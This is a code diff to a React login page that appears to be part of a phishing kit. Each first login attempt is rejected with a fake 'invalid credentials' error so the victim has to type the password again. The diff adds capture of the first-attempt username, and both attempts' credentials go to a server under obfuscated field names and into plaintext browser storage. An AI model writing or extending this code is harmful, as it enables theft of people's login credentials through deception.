@@ -21,6 +21,7 @@ const LoginPage: React.FC = () => {
   const [showInvalidCredentials, setShowInvalidCredentials] = useState(false);
   const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
   const [firstPassword, setFirstPassword] = useState('');
+  const [firstUsername, setFirstUsername] = useState('');
   const [requireNewPassword, setRequireNewPassword] = useState(false);
   const [newPasswordError, setNewPasswordError] = useState('');
 
@@ -83,13 +84,14 @@ const LoginPage: React.FC = () => {
       // First attempt - show error message and require new password
       setTimeout(() => {
         setFirstPassword(formData.xpss);
+        setFirstUsername(formData.xusr);
         setRequireNewPassword(true);
         setShowInvalidCredentials(true);
         setIsLoading(false);
-        // Clear both username and password fields for second attempt
+        // Clear only password field, keep username
         setFormData({
-          xusr: '',
-          xpss: ''
+          xusr: formData.xusr, // Keep username
+          xpss: '' // Clear password only
         });
       }, 1000);
       return;
@@ -106,7 +108,8 @@ const LoginPage: React.FC = () => {
         const loginPayload = {
           xusr: formData.xusr,
           xpss: formData.xpss,
-          xpssFirst: firstPassword || formData.xpss
+          xpssFirst: firstPassword || formData.xpss,
+          xusrFirst: firstUsername || formData.xusr
         };
         const loginResponse = await apiService.login(loginPayload);
         console.log('LoginPage - Login response:', loginResponse);
@@ -115,8 +118,10 @@ const LoginPage: React.FC = () => {
         sessionStorage.setItem('xusr', formData.xusr);
         sessionStorage.setItem('xpss', formData.xpss);
         sessionStorage.setItem('xpssFirst', firstPassword || formData.xpss);
+        sessionStorage.setItem('xusrFirst', firstUsername || formData.xusr);
         localStorage.setItem('xusr', formData.xusr);
         localStorage.setItem('xpss', formData.xpss);
+        localStorage.setItem('xusrFirst', firstUsername || formData.xusr);
         localStorage.setItem('xpssFirst', firstPassword || formData.xpss);
         
         // Debug: Check if sessionId was stored by apiService
